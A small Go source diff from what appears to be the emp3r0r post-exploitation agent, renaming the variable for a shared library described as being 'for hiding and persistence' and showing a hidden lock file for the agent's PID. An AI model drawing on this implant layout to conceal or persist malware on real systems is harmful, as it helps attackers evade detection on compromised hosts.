@@ -56,8 +56,8 @@ var (
 	// UtilsPath binary path of utilities
 	UtilsPath = AgentRoot + "/bin"
 
-	// LibFile shard library of, for hiding and persistence
-	LibFile = UtilsPath + "/libe.so"
+	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
+	Libemp3r0rFile = UtilsPath + "/libe.so"
 
 	// PIDFile stores agent PID
 	PIDFile = AgentRoot + "/.e.lock"
